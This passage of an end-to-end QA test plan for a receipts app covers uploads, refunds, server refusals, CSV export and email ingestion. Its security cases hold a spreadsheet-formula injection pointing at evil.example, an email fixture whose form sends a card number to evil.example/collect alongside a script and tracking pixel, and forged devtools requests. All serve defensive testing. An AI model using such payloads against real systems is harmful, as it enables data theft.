| 2 | Feed the camera input: `rcptPick([{ name: 'photo.jpg', type: 'image/jpeg', base64: JPEG_A }], 'camera-input')` (or the browser tool's file upload on `#camera-input` with the decoded file). | A row "photo.jpg", "1 KB", ending "✓ Uploaded. View receipt". |
| 3 | Click **View receipt** (**record** the id as `J1`). | **Processed**, "Staples · 2026-10-09", "Source: uploaded · photo.jpg". The preview is a blue image, loaded (`naturalWidth` 80), from a presigned URL on the S3 host. Vendor chip **New vendor** with "First receipt from this vendor. Fix the name if you like, then mark it vetted so future receipts are matched to it first." |
| 4 | Click **Mark as vetted**. | Chip **Vetted** (later cases rely on Staples being vetted for `F`). |
| 5 | **Download original**. | `photo.jpg`, 708 bytes. |
| 6 | Back on the upload page (helper pasted again): `rcptPick([{ name: 'scan.webp', type: 'image/webp', base64: WEBP_A }, { name: 'phone.heic', type: '', base64: HEIC_A }])`. (The empty type is what Chrome sends for a `.heic` file; the extension decides.) | Both rows end "✓ Uploaded. View receipt"; neither is refused as unsupported. |
| 7 | Open the WebP receipt (**record** `W1`). | **Processed**; a green image preview (`naturalWidth` 80); **Open full size** shows it inline in a new tab. A "Possible duplicate of Staples, 2026-10-09, USD 42.10" banner (of `J1`). |
| 8 | Open the HEIC receipt (**record** `H1`). | **Processed**, "Source: uploaded · phone.heic". The preview is an orange image (`naturalWidth` 64): the server's JPEG rendering of the photo, which the browser can show. **Open full size** opens that JPEG inline. |
| 9 | Click **Download original** on `H1`. | The browser downloads `phone.heic`, 445 bytes, byte-identical to `HEIC_A` (the original, not the rendering). |
| 10 | Reload the upload page; open `/billing/credits/`. | "Balance: 997 credits". Three "-1 Spend" rows: "Receipt processing: photo.jpg", "…: scan.webp", "…: phone.heic". |

### RCPT-48 Files the server can't read: unreadable and too large, refunded

**Purpose:** a file that passes the type check but can't be decoded fails `unreadable` (can be run
again), a file over the image size limit fails `too_large` (can't), and both give the credit back.
**Preconditions:** `F` on `/receipts/upload/`, helper pasted with `BAD_PNG`, `HUGE_PNG`. Balance 997.

| # | Action | Expected result |
|---|---|---|
| 1 | `rcptPick([{ name: 'broken.png', type: 'image/png', base64: BAD_PNG }])`. | "✓ Uploaded. View receipt": the upload itself succeeds (its first bytes are a PNG's); it fails while being read. |
| 2 | Open it (**record** `U1`). | Heading "broken.png", red **Failed** pill. Right panel instead of the form: "We couldn't read this file." / "Try a sharper photo or scan and upload it again." / "Your credits for this attempt were returned." with **Re-run extraction (1 credit)** and **Move to trash**. The preview shows a broken image (the file isn't a real image), with **Download original** below. |
| 3 | `/billing/credits/`. | Balance 997: a "-1 Spend" "Receipt processing: broken.png" and a "+1 Refund" "Receipt could not be processed: broken.png". |
| 4 | On `U1` click **Re-run extraction (1 credit)** and confirm. | "Reading the receipt again. This usually takes a few seconds."; the page shows **Failed** with the same text. The credits history has a second Spend/Refund pair; balance still 997. |
| 5 | Upload `rcptPick([{ name: 'huge.png', type: 'image/png', base64: HUGE_PNG }])` and open it (**record** `T1`). | **Failed**: "This file is too large or too complex to read." / "Upload a smaller or simpler version of it, or a photo or scan of the receipt." / "Your credits for this attempt were returned." Only **Move to trash**: no **Re-run extraction**. Balance 997 (Spend and Refund "…: huge.png"). |
| 6 | (Devtools) Forge the re-run: `fetch(location.pathname + 'reprocess/', {method: 'POST', redirect: 'manual', headers: {'X-CSRFToken': document.cookie.match(/csrftoken=([^;]+)/)[1]}}).then(() => location.reload())`. | Red flash "This file cannot be processed again."; no new transaction. |
| 7 | Open `/receipts/`. | The two failed rows at the top (undated), second lines "upload · We couldn't read this file. Try a sharper photo or scan and upload it again. · added …" and "upload · This file is too large or too complex to read. Upload a smaller or simpler version of it, or a photo or scan of the receipt. · added …". **Failed** badge **2**. |

### RCPT-49 Dropping a folder, and cancelling uploads

**Purpose:** a dropped folder is walked (subfolders too) into a flat list of files, each checked like
a picked file; an empty folder does nothing; cancelling a row removes it and its file is never sent.
**Preconditions:** `F` on `/receipts/upload/` (reload it), helper pasted with `PNG_A`, `PNG_B`.
Balance 997. Keep the network log open.

| # | Action | Expected result |
|---|---|---|
| 1 | `rcptDropFolder('scans', { 'a.png': { type: 'image/png', base64: PNG_A }, inner: { 'b.png': { type: 'image/png', base64: PNG_B }, 'readme.txt': { type: 'text/plain', text: 'not a receipt' } } })`. | Three rows named by the file alone, no folder path: "a.png" and "b.png" end "✓ Uploaded. View receipt"; "readme.txt" shows red "✕ Unsupported file type. Use PDF, JPG, PNG, HEIC or WebP." and sends nothing. (**Record** the two receipts as `A1` and `A2`.) |
| 2 | `rcptDropFolder('empty', {})`. | Nothing happens: no new row, no alert or dialog. |
| 3 | If the browser tool can drag a real file over the zone, hover one over it. | The dashed box turns sage and grows slightly while a file is over it, and returns to normal when it leaves. (Skip if the tool can't drag.) |
| 4 | Reload, paste the helper, then in **one** console command: `rcptPick(['c1','c2','c3','c4'].map((n) => ({ name: n + '.png', type: 'image/png', base64: PNG_A }))); const b = document.querySelectorAll('#upload-list button[aria-label^="Cancel upload of"]'); b[0].click(); b[3].click();` | The rows "c1.png" (started) and "c4.png" (still queued: three upload at a time) disappear at once. "c2.png" and "c3.png" end "✓ Uploaded. View receipt". The network log has exactly two `POST /receipts/upload/start/` (for c2 and c3), none for c1 or c4. |
| 5 | Open `/receipts/` and `/billing/credits/`. | `a.png`, `b.png`, `c2.png`, `c3.png` are listed (Staples, flagged "possible duplicate"); no c1 or c4. Balance **993**. |

### RCPT-50 The server's own refusals, and S3 enforcing the signed size and checksum

**Purpose:** the upload endpoints refuse what the page would never send, and a PUT whose bytes differ
from what was signed is refused by S3 (or caught by the server) instead of being stored.
**Preconditions:** `F` on `/receipts/upload/`, devtools console open. Paste:

```js
const csrf = document.cookie.match(/csrftoken=([^;]+)/)[1];
const post = (url, body) => fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-CSRFToken': csrf }, body: typeof body === 'string' ? body : JSON.stringify(body) }).then(async (r) => [r.status, await r.json()]);
const sum = async (s) => btoa(String.fromCharCode(...new Uint8Array(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(s)))));
const zeros = btoa(String.fromCharCode(...new Uint8Array(32)));
```

| # | Action | Expected result |
|---|---|---|
| 1 | `await post('/receipts/upload/start/', { name: 'big.pdf', size: 15728641, content_type: 'application/pdf', checksum_sha256: zeros })`. | `[422, {error: "The file is too large (the limit is 15728640 bytes)."}]`. |
| 2 | Same with `{ name: 'notes.txt', size: 5, content_type: 'text/plain', checksum_sha256: zeros }`. | `[422, {error: "This file type is not supported. Use PDF, JPG, PNG, HEIC or WebP."}]`. |
| 3 | Same with `size: 0` (name `x.png`, type `image/png`). | `[422, {error: "The file is empty."}]`. |
| 4 | Same with a valid size and `checksum_sha256: 'abc'`. | `[422, {error: "The file checksum must be a base64-encoded SHA-256."}]`. |
| 5 | `await post('/receipts/upload/start/', '{"name": "x.png", "size": 1e400, "content_type": "image/png", "checksum_sha256": "' + zeros + '"}')`, then the same with `"size": 12.5`. | Both `[422, {error: "The file size must be a whole number of bytes."}]` (never a 500). |
| 6 | Same with `name: '   '`. | `[422, {error: "The file needs a name."}]`. |
| 7 | Start a real one whose checksum is of other bytes: `const [s1, t1] = await post('/receipts/upload/start/', { name: 'mismatch.png', size: 5, content_type: 'image/png', checksum_sha256: await sum('HELLO') }); [s1, t1.url]`. | `201` and a `url` on the S3 host. |
| 8 | PUT different bytes of the signed length: `(await fetch(t1.url, { method: 'PUT', headers: t1.headers, body: new Blob(['hello']) })).status`. | A 4xx (S3 refuses a body whose SHA-256 doesn't match the signed `x-amz-checksum-sha256`). **Record** the status. |
| 9 | `await post('/receipts/upload/' + t1.receipt_id + '/complete/', {})`. | `[422, {error: "The file has not been uploaded."}]` (nothing was stored). If step 8 answered 200 instead (S3 did not check), this must answer `[422, {error: "The uploaded file is corrupted."}]` and the receipt shows as **Failed** on the dashboard: note it in the report, then move that receipt to the trash and delete it forever. |
| 10 | The same with a body one byte longer than signed: start `{ name: 'long.png', size: 5, content_type: 'image/png', checksum_sha256: await sum('hello') }`, PUT `new Blob(['hello!'])`, then complete. | The PUT is refused (4xx, the length is signed) and complete answers "The file has not been uploaded." (If the PUT was accepted: complete answers "The uploaded file is not the size declared." and the failed receipt is cleaned up as in step 9; note it.) |
| 11 | `await post('/receipts/upload/<J1>/complete/', {})` is fine (already complete); now try another user's: `await fetch('/receipts/upload/<R1_ID>/complete/', { method: 'POST', headers: { 'X-CSRFToken': csrf } }).then((r) => r.status)`. | The first answers `200` with `ok: true` (completing twice changes nothing); the second `404` (`R1_ID` is `qa.user`'s). |
| 12 | Open `/receipts/` and `/billing/credits/`. | No new receipts (an upload that never completed is not listed), balance still 993. |

### RCPT-51 Trashed receipts on the Vendors page, and restoring from a receipt's page

**Purpose:** a vendor's trashed receipts are shown as "+N in Trash" and still block deleting it; the
Restore button on a trashed receipt's page brings it back to that page, editable.
**Preconditions:** `F`; Staples is vetted (RCPT-47).

| # | Action | Expected result |
|---|---|---|
| 1 | Open `H1`, set **Vendor** to `Heic Shop`. | No blue "On save, future receipts read as …" hint (Staples is vetted, so nothing would be taught). |
| 2 | **Save**. | "Saved."; heading "Heic Shop · 2026-10-09", chip **Vetted**, "Read on the receipt as “Staples”. Filed under your vendor Heic Shop (1 receipt)." |
| 3 | Click **Move to trash**. | `/receipts/` with "Moved to the trash. You can restore it from there for 30 days."; link **Trash (1)**. |
| 4 | Open `/receipts/vendors/`. | **Heic Shop** shows receipts **0** with "+1 in Trash" under the number, last receipt "—". Its menu's **Delete** is grayed out (`aria-disabled="true"`) with the tooltip "Only a vendor with no receipts can be deleted. Merge it into another vendor instead." |
| 5 | (Devtools) Forge the delete as in RCPT-35 step 6, with Heic Shop's id. | The reloaded page shows the red flash "Heic Shop still has receipts. Merge it into another vendor instead of deleting it." and Heic Shop is still listed. |
| 6 | Open `/receipts/<H1>/`. | The gray "This receipt is in the Trash. Restore it to edit it." banner with **Restore**; the form is disabled. |
| 7 | Click **Restore**. | You stay on `H1`'s page (not the Trash), with "Restored Heic Shop."; no banner; the form is editable again with **Save**. The Trash link has no number. |
| 8 | On `/receipts/vendors/`. | Heic Shop: receipts **1**, no "+ in Trash", last receipt 2026-10-09. |

### RCPT-52 Receipt-date presets against today

**Purpose:** each preset covers the right days relative to the user's today (its own time zone);
Custom works with only one end; "Any date" wins over dates left in the URL.
**Preconditions:** `F`. Let `TODAY` be today's date in your browser's time zone (the account picked it
up at sign-in) and `T20` the date 20 days before it.

| # | Action | Expected result |
|---|---|---|
| 1 | On `J1` set **Receipt date** `TODAY` and **Notes** `rangecheck`, **Save**. On `W1` set `T20` and the same note. On `A1` set January 1 of this year and the same note. | Three "Saved." flashes. |
| 2 | On `/receipts/` search `rangecheck`. | Exactly `J1`, `W1`, `A1`, newest receipt date first. |
| 3 | Choose **Last 15 days**. | Only `J1`. URL `date_range=last_15_days` (with `q=rangecheck`). |
| 4 | Choose **Last 30 days**. | `J1` and `W1`. |
| 5 | Choose **This month**. | `J1`, plus `W1` only if `T20` is in this month, plus `A1` only if this month is January. |
| 6 | Choose **This quarter**. | Those dated in the current calendar quarter (Jan-Mar, Apr-Jun, Jul-Sep or Oct-Dec). |
| 7 | Choose **This year**. | All three (`W1` only if `T20` is still this year). |
| 8 | Choose **Custom**, set only the **from** date to `T20` (leave **to** empty). | `J1` and `W1`; the URL has `date_from` and no `date_to` or `date_range`. |
| 9 | Clear **from**, set only **to** = January 1 of this year. | Only `A1`. |
| 10 | Open `/receipts/?q=rangecheck&date_from=<TODAY>`. | **Custom** selected with that date: only `J1` (dates without a `date_range` mean Custom). |
| 11 | Open `/receipts/?q=rangecheck&date_range=any&date_from=<TODAY>`. | **Any date** selected, the date inputs hidden, all three listed ("Any date" wins over the left-over date). |

### RCPT-53 The CSV export guards against spreadsheet formulas

**Purpose:** a cell that a spreadsheet would run as a formula is exported with a leading apostrophe.
**Preconditions:** `F`.

| # | Action | Expected result |
|---|---|---|
| 1 | On `J1` set **Notes** `=HYPERLINK("http://evil.example","click")` and **Number** `-1`; **Save**. On `W1` set **Notes** `@SUM(A1)`; **Save**. | "Saved." each; the page shows the values exactly as typed (no apostrophe on the page). |
| 2 | In the console: `await fetch('/receipts/export.csv?q=evil').then((r) => r.text())`. | The header line, then one row for `J1` whose `document_number` cell is `'-1` and whose `notes` cell is `"'=HYPERLINK(""http://evil.example"",""click"")"` (CSV-quoted, apostrophe first). |
| 3 | `await fetch('/receipts/export.csv?q=SUM').then((r) => r.text())`. | One row for `W1` with the notes cell `'@SUM(A1)`. |
| 4 | Click **Export CSV** on `/receipts/?q=evil` and open the file in a text editor (or a spreadsheet, if the tool has one). | The download is the same text as step 2; a spreadsheet shows the note as text, not a link. |
| 5 | Put `J1`'s notes back to empty and **Number** to `R-55102`, `W1`'s notes to empty; **Save** each. | "Saved." |

### RCPT-54 Email receipts: the body is shown in a sandbox -- shell step

**Purpose:** an email with no attachment becomes a receipt of its body; the sender's HTML is served
by the site as an isolated document in a sandboxed frame, so no script runs, nothing remote loads and
no form submits; a plain-text body is escaped. An email that merely claims to be Gmail's forwarding
confirmation is an ordinary email.
**Preconditions:** `F`, Receipts settings on **Anyone**, `ADDR_F` recorded. Save these two files in a
scratch folder (keep the line breaks; the `To:` line is replaced by `--to`). Without a shell mark the
case **BLOCKED (needs-shell)**.

`rcpt-body.eml`:

```text
From: Shop Example <orders@shop.example>
To: receipts+code@ziptrigo.com
Subject: Your order receipt
MIME-Version: 1.0
Content-Type: text/html; charset=utf-8

<!doctype html><html><head><style>h1 { color: #336699; }</style></head><body>
<h1>Thanks for your order</h1>
<p>Staples order total: 42.10 USD, paid 2026-10-09.</p>
<p id="script-check">Scripts did not run.</p>
<img src="https://tracker.example/pixel.gif" alt="tracking pixel">
<form action="https://evil.example/collect"><input name="card" placeholder="Card number"><button>Send</button></form>
<script>document.getElementById('script-check').textContent = 'SCRIPT RAN';</script>
</body></html>
```

`rcpt-text.eml`:

```text
From: Gmail Team <forwarding-noreply@google.com>
To: receipts+code@ziptrigo.com
Subject: (#999999999) Gmail Forwarding Confirmation
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8

Confirmation code: 999999999
This text has <b>not bold</b> markup in it.
https://mail-settings.google.com/mail/vf-fake
```

| # | Action | Expected result |
|---|---|---|
| 1 | (Shell step) `python tests_e2e/ai/manage.py receipts_ingest_eml <folder>/rcpt-body.eml --to <ADDR_F>`. | It prints a line for the address ending `: accepted, 1 receipt(s)`, then `Done (receipts/inbound/local-<uuid>).` |
| 2 | Reload `/receipts/`. | A new row **Staples**, **Processed**, whose second line starts with an envelope icon and "email" (not "upload"). |
| 3 | Open it (**record** `E1`). | "Staples · 2026-10-09". "Source: email from orders@shop.example" and, on the next line, “Your order receipt”. **Download original** is there; **Open full size** is not. |
| 4 | Look at the preview. | An iframe titled "Email body" with a bare `sandbox` attribute (no `allow-…` tokens) and `referrerpolicy="no-referrer"`, white even in dark mode. It shows the heading "Thanks for your order" in blue (the email's own inline style applies), "Staples order total: 42.10 USD, paid 2026-10-09.", and **"Scripts did not run."** (never "SCRIPT RAN"). The tracking pixel is not loaded (a broken image or its alt text) and the network log has **no** request to `tracker.example`; a CSP violation in the console for it is expected, not a failure. |
| 5 | Type in the frame's "Card number" box and click **Send**. | Nothing is submitted: no request to `evil.example`, the frame does not navigate. |
| 6 | In the network log, check the receipt page's own response headers. | `Content-Security-Policy: frame-src 'self'` (only on the page of an email-body receipt; `J1`'s page has no such header). |
| 7 | In the receipt page's console: `const r = await fetch('/receipts/<E1>/body/'); [r.status, r.headers.get('content-type'), r.headers.get('content-security-policy'), r.headers.get('x-content-type-options'), r.headers.get('referrer-policy'), r.headers.get('cache-control')]`. | `[200, "text/html; charset=utf-8", "default-src 'none'; img-src data:; style-src 'unsafe-inline'; base-uri 'none'; form-action 'none'; frame-ancestors 'self'; sandbox", "nosniff", "no-referrer", "private, no-store"]`. |
| 8 | Open `/receipts/<E1>/body/` in a new tab, top-level. | The email renders on its own, still "Scripts did not run."; in that tab's console `window.origin` is `"null"` (the CSP `sandbox` makes the document an opaque origin even outside the frame). Close the tab. |
| 9 | Click **Download original**. | A file `email.html` downloads, containing the original HTML (the `<script>` included: it is the stored body, served as a download, never run). |
| 10 | (Shell step) `python tests_e2e/ai/manage.py receipts_ingest_eml <folder>/rcpt-text.eml --to <ADDR_F>`. | `: accepted, 1 receipt(s)`. |
| 11 | Open the new row (**record** `E2`). | **Processed**; "Source: email from forwarding-noreply@google.com". The frame shows the text in a monospace block, with `<b>not bold</b>` **literally** (escaped, not bold). **Download original** gives `email.txt`. |
| 12 | Open `/receipts/settings/`. | **No** "Gmail forwarding confirmation" box: without SES's authentication the email is not trusted as Google's, so it was read as an ordinary email. **Recent emails**: two rows, newest first, each with the date (e.g. "Nov 1"), the sender and the subject in quotes: forwarding-noreply@google.com “(#999999999) Gmail Forwarding Confirmation” and orders@shop.example “Your order receipt”, both with a green check and "1 receipt". |
| 13 | `/billing/credits/`. | Balance **991**: two "-1 Spend" rows "Receipt processing: email". |
| 14 | As `qa.user` (another browser context), open `/receipts/<E1>/body/` and `/receipts/<E1>/`; as `F`, open `/receipts/<J1>/body/`. | 404 for all three (another user's receipt; a receipt that is not an email body). |

### RCPT-55 The "needs your attention" email and the Recent emails outcomes -- shell step

**Purpose:** an emailed receipt that fails sends one "needs your attention" email with working links;
the accepted-senders list, spam verdicts, forwarding confirmations, emails with nothing usable and a
retired address each end as the right outcome in Recent emails, without charging.
**Preconditions:** RCPT-54. Save these files in the same scratch folder. Without a shell mark the case
**BLOCKED (needs-shell)**.

`rcpt-scan.eml` (an attachment that looks like a PNG and can't be read):

```text
From: Office Scanner <scanner@office.example>
To: receipts+code@ziptrigo.com
Subject: Scanned receipt
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="b1"

--b1
Content-Type: text/plain; charset=utf-8

Scan attached.
--b1
Content-Type: image/png
Content-Disposition: attachment; filename="scan.png"
Content-Transfer-Encoding: base64

iVBORw0KGgp0aGlzIGlzIG5vdCByZWFsbHkgYSBwbmcgaW1hZ2UgYXQgYWxsdGhpcyBpcyBub3QgcmVhbGx5IGEgcG5nIGltYWdlIGF0IGFsbHRoaXMgaXMgbm90IHJlYWxseSBhIHBuZyBpbWFnZSBhdCBhbGw=
--b1--
```

`rcpt-forged.eml` (claims to be from an allowed sender, but SES vouched for nothing):

```text
From: Someone <someone@else.example>
To: receipts+code@ziptrigo.com
Subject: Pretending to be listed
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8

Staples order total 42.10 USD, paid 2026-10-09.
```

`rcpt-note.eml` (from the allowed sender, authenticated, with nothing that can be a receipt):

```text
Authentication-Results: amazonses.com; dmarc=pass header.from=else.example;
From: Someone <someone@else.example>
To: receipts+code@ziptrigo.com
Subject: Just a note
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="b2"

--b2
Content-Type: text/plain; charset=utf-8

hi
--b2
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="notes.txt"

not a receipt, only some notes
--b2--
```

`rcpt-spam.eml`:

```text
X-SES-Spam-Verdict: FAIL
X-SES-Virus-Verdict: PASS
From: Spammer <win@prizes.example>
To: receipts+code@ziptrigo.com
Subject: You won
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8

Staples order total 42.10 USD, paid 2026-10-09. Claim your prize now.
```

`rcpt-forward.eml` (a Gmail forwarding confirmation that SES authenticated as Google's):

```text
Authentication-Results: amazonses.com; dmarc=pass header.from=google.com;
From: Gmail Team <forwarding-noreply@google.com>
To: receipts+code@ziptrigo.com
Subject: (#123456789) Gmail Forwarding Confirmation - Receive Mail from qa@example.com
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8

qa@example.com has requested to automatically forward mail to your email address.
Confirmation code: 123456789

To allow, click the link below:
https://mail-settings.google.com/mail/vf-%5BQA%5D-123
```

| # | Action | Expected result |
|---|---|---|
| 1 | (Shell step) `python tests_e2e/ai/manage.py receipts_ingest_eml <folder>/rcpt-scan.eml --to <ADDR_F>`. | `: accepted, 1 receipt(s)`. |
| 2 | Open `/__e2e__/mail/?to=<F>` (reload until it arrives, up to a minute). | One email, subject "1 receipt needs your attention". Text: `From the email "Scanned receipt" (received <Mon DD, HH:MM> UTC):`, then `  - scan.png couldn't be read`, then `Manage receipts: http://localhost:8765/receipts/`. The HTML source has the same, with a **Review** link to `http://localhost:8765/receipts/<id>/` on the scan.png line and a **Manage receipts** link (the apostrophe may appear as `&#x27;` in the source: escaping). Nothing in the subject comes from the email. |
| 3 | Open the **Review** link (copy its `href` from the HTML source) and then **Manage receipts**. | Review: the receipt (**record** `S1`) is **Failed** with "We couldn't read this file." / "Try a sharper photo or scan and upload it again." / "Your credits for this attempt were returned.", "Source: email from scanner@office.example", “Scanned receipt”. Manage receipts: `/receipts/`. |
| 4 | `/billing/credits/`. | "-1 Spend" "Receipt processing: scan.png" and "+1 Refund" "Receipt could not be processed: scan.png"; balance 991. |
| 5 | On `S1` click **Re-run extraction (1 credit)** and confirm; wait a minute and reload the mailbox. | It fails again and is refunded again; **no** second "needs your attention" email (one per email received). |
| 6 | On `/receipts/settings/` choose **Only these**, enter `someone@else.example`, **Save**. | "✓ Saved". |
| 7 | (Shell step) Ingest `rcpt-forged.eml`, then `rcpt-body.eml`, each with `--to <ADDR_F>`. | Both print `: rejected_sender, 0 receipt(s)`: a `From` on the list is not enough without SES's authentication, and orders@shop.example is not on it. |
| 8 | (Shell step) Ingest `rcpt-note.eml`. | `: no_receipt, 0 receipt(s)` (the sender passed; the short text and the `.txt` file can't be receipts). |
| 9 | (Shell step) Ingest `rcpt-spam.eml`; then edit it so the first two lines read `X-SES-Spam-Verdict: PASS` and `X-SES-Virus-Verdict: FAIL` and ingest it again. | `: rejected_spam, 0 receipt(s)`, then `: rejected_virus, 0 receipt(s)`. |
| 10 | (Shell step) Ingest `rcpt-forward.eml`. | `: forwarding_confirmation, 0 receipt(s)`, although the accepted-senders list doesn't include Google (a confirmation must get through to finish setting up forwarding). |
| 11 | Reload `/receipts/settings/`. | Under the address, a blue box: "Gmail forwarding confirmation received <Mon D> — code **123456789**" with an **Open** button whose `href` is `https://mail-settings.google.com/mail/vf-%5BQA%5D-123` and opens in a new tab (don't follow it: it is an external site). **Recent emails**, newest first: forwarding-noreply@google.com "forwarding confirmation" (gray info icon); win@prizes.example "flagged as a virus" and "flagged as spam" (red); someone@else.example “Just a note” "no receipt found"; orders@shop.example “Your order receipt” and someone@else.example “Pretending to be listed” "sender not allowed"; scanner@office.example “Scanned receipt” "1 receipt" (green); then the two of RCPT-54. |
| 12 | `/receipts/` and `/billing/credits/`. | No new receipts besides `S1`; balance still 991; no further "needs your attention" email. |
| 13 | Choose **Anyone**, **Save**. Then **Regenerate…** the address and confirm; **record** the new one as `ADDR_F2`. | "Your new address is ready. The old one no longer works." |
| 14 | (Shell step) Ingest `rcpt-body.eml` with `--to <ADDR_F>` (the old address). | `No recipient matched an active inbox code.` then `Done (…)`; nothing new on the dashboard or in Recent emails. |

### RCPT-56 Paused while the upload page is open; the email body while paused -- shell step

**Purpose:** a page loaded before the account was paused still can't upload (the server answers
402, the row offers Top up); the email body is refused too; the owner gets the email and the bell
notification, and a top-up resumes everything.
**Preconditions:** RCPT-55. `F` on `/receipts/upload/`, helper pasted with `PNG_B` (do not reload the
page after the shell step). Without a shell mark the case **BLOCKED (needs-shell)**.

| # | Action | Expected result |
|---|---|---|
| 1 | (Shell step) `python tests_e2e/ai/manage.py shell -c "from apps.receipts.models import ReceiptsAccount; from apps.receipts.services.metering import freeze_account; freeze_account(ReceiptsAccount.objects.get(user__email='<F>')); print('frozen')"`. | Prints `frozen`. |
| 2 | On the still-open upload page: `rcptPick([{ name: 'late.png', type: 'image/png', base64: PNG_B }])`. | The row shows red "✕ Your receipts are paused until you add credits." followed by a **Top up** link to `/billing/credits/`. The `upload/start/` request answered 402. |
| 3 | Reload the upload page. | The "Storage is paused." banner; **Choose files** and **Take photo** disabled; "Uploads are paused until you add credits." |
| 4 | Open `E1`'s page. | The preview says "Previews and downloads are paused until you add credits." with **Top up** (no frame, no **Download original**). |
| 5 | Open `/receipts/<E1>/body/` directly. | A plain page "Your receipts are paused until you add credits." (status 402), not the email. |
| 6 | Open `/__e2e__/mail/?to=<F>` (reload until it arrives, up to a minute). | "Your receipts storage is paused", content and links as in RCPT-44 step 6. |
| 7 | The bell. | A new "Receipts storage is paused" notification (next to the earlier welcome-credits one). |
| 8 | As `qa.admin`, add 1 credit to `F` with the adjustment tool. | "… New balance: 992." |
| 9 | As `F`, reload `/receipts/`, `E1`'s page and the bell. | No banner; the email body shows in its frame again; the "Receipts storage is paused" notification is gone. `late.png` was never created (not on the dashboard, nothing charged). |

### RCPT-57 What the Receipts settings change: a free price, the daily file limit

**Purpose:** the admin's price per file and daily limit drive the upload page, the re-run button and
the refusals (email intake included).
**Preconditions:** RCPT-56. Two browser contexts: `qa.admin` and `F` (`F` on `/receipts/upload/`
with the helper pasted with `PNG_A`, `PNG_B`). Balance of `F` 992.

| # | Action | Expected result |
|---|---|---|
| 1 | As admin open `/admin/receipts/receiptssettings/`, set **Price per file (credits)** to `0`, **Save**. | Saved. |
| 2 | As `F` reload the upload page. | The drop zone line ends "· up to 15 MB · free". |
| 3 | `rcptPick([{ name: 'free.png', type: 'image/png', base64: PNG_B }])`; open it (**record** `X1`). | **Processed**. The re-run button reads **Re-run extraction (free)**. |
| 4 | Click it. | The modal says "This is free. The receipt is read again from the original file; anything you edited and your notes are kept." and its confirm button reads "Re-run extraction". Confirm: "Reading the receipt again…". |
| 5 | `/billing/credits/`. | No new transaction for `free.png` (neither the upload nor the re-run); balance 992. |
| 6 | As admin set **Price per file (credits)** back to `1` and **Max files per user per day** to `2`; **Save**. | Saved. |
| 7 | As `F` reload the upload page, paste the helper, `rcptPick([{ name: 'capped.png', type: 'image/png', base64: PNG_A }])`. | Red "✕ You can add up to 2 receipts per day." No receipt is created, nothing charged. |
| 8 | (Shell step, optional) `python tests_e2e/ai/manage.py receipts_ingest_eml <folder>/rcpt-body.eml --to <ADDR_F2>`. | A line ending `: rejected_cap…, 0 receipt(s)`; Recent emails in settings shows orders@shop.example with "daily limit reached". |
| 9 | As admin set **Max files per user per day** back to `100`; **Save**. As `F` reload, paste the helper and upload `capped.png` again (**record** `X2`). | "✓ Uploaded. View receipt"; balance 991 ("Receipt processing: capped.png"). The admin settings are back to their defaults (1 credit, 100 a day). |

### RCPT-58 Re-running without enough credits

**Purpose:** a re-run the balance can't cover is refused up front, with nothing charged or changed.
**Preconditions:** RCPT-44 (`qa.broke` has 5 credits and the processed receipt `B1_ID`).

| # | Action | Expected result |
|---|---|---|
| 1 | As `qa.admin`, with the adjustment tool, **Spend** `5` from `qa.broke@example.com` (description `QA drain`). | "Adjusted credits for qa.broke@example.com. New balance: 0." |
| 2 | Sign in as `qa.broke@example.com`; open `/receipts/<B1_ID>/`; click **Re-run extraction (1 credit)** and confirm. | Back on the page with the red flash "You don't have enough credits to run the extraction again."; the receipt stays **Processed** with its fields. |
| 3 | `/billing/credits/`. | Balance 0; no new Spend row. |
| 4 | `/receipts/upload/`. | "Balance: 0 credits" and the "You don't have enough credits to read a receipt right now…" notice (RCPT-42). Log out. |

### RCPT-59 Phone width, dark mode and keyboard

**Purpose:** every Receipts page works at phone width and in dark mode, and the main controls work
from the keyboard.
**Preconditions:** signed in as `F`.

| # | Action | Expected result |
|---|---|---|
| 1 | Set the window to 375x812 and open `/receipts/`. | No horizontal scroll. The heading, **Export CSV** and **Upload** wrap; the address strip breaks inside the address rather than overflowing; tabs and the Vendors/Trash links wrap. The list's header shows only the **Receipt date** and **Added** sort links (no Vendor/Category/Amount/Status columns). Each row: the vendor (or file name) and the pill on the first line, then "<date or No date> · <category> · <currency amount>", then the source line. |
| 2 | Open `J1`, then `E1`. | The preview is above the form (one column); the form's fields and buttons fit the width; the email frame fits too. |
| 3 | Open `/receipts/upload/`, `/receipts/trash/`, `/receipts/settings/`. | Nothing overflows: the drop zone's two buttons fit (or wrap), the category editor's buttons stay on screen, the Recent emails rows stack (date, sender and subject, outcome). |
| 4 | Open `/receipts/vendors/`. | Each row shows the name, its chip and, under it, "N receipts · last YYYY-MM-DD" (the count and date columns are hidden); a row menu opens fully on screen. Tick a vendor: the bulk bar fits. |
| 5 | Back to desktop width. On `/account/` under **Appearance** choose **Dark**; open the dashboard, a receipt, upload, Trash, Vendors (open a row menu and the rename dialog) and settings (open the Regenerate dialog, then Cancel). | Every surface has a dark twin: no white boxes except the email body frame (white on purpose: it is the sender's page), readable pills, chips, the amber duplicate banner, red errors and dialogs. |
| 6 | Set **Appearance** back to **System**. | Light again (or the OS setting). |
| 7 | On `/receipts/`, press Tab from the top. | The first stop is "Skip to content"; then the header, the strip's **Copy** and **Settings ->**, the tabs, **Vendors**, **Trash**, the search box, the two selects, the sort links and each row (one link per row), all with a visible focus ring. Enter on a tab switches it; Enter on a row opens the receipt. |
| 8 | On `/receipts/vendors/`, Tab to "Actions for Staples" and press Enter. | The menu opens; Tab moves through its items; Escape closes it. |
| 9 | On `J1`, Tab to **Re-run extraction (1 credit)** and press Enter. | The modal opens with focus on **Cancel**; Escape closes it and nothing is charged. |

### RCPT-60 Picking a vendor with the keyboard, and "Merge into…" from a row

**Purpose:** Enter picks the highlighted suggestion without saving; a single vendor can be merged into
another from its row menu.
**Preconditions:** `F`; vendors Staples and Heic Shop (RCPT-51), both vetted.

| # | Action | Expected result |
|---|---|---|
| 1 | Open `A1`, select the **Vendor** text and type `heic`. | The listbox opens with a "Vetted" group holding **Heic** Shop (the typed part in bold) and its receipt count, then "Use “heic” as a new vendor". |
